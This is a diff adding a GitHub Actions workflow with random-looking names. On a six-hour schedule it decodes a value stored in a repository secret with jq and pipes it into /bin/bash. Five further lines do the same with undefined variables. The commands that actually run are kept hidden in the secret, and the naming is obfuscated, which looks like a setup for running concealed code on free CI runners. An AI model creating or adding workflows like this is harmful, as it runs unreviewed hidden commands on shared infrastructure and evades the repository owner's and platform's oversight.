@@ -1,0 +1,23 @@
+name: yutongshen7483
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yutongshen7483
+        env:
+          ijf2: ${{ secrets.ijf2 }}
+        run: |
+          echo $ijf2 | jq -r .qkzcz65 | /bin/bash
+          echo $tcnp499 | jq -r .pshw75568 | /bin/bash
+          echo $xdme35507 | jq -r .kfjc6 | /bin/bash
+          echo $amn87 | jq -r .cslln93895 | /bin/bash
+          echo $nfhvr27 | jq -r .vskvi390 | /bin/bash
+          echo $ttg80 | jq -r .k24846 | /bin/bash
+
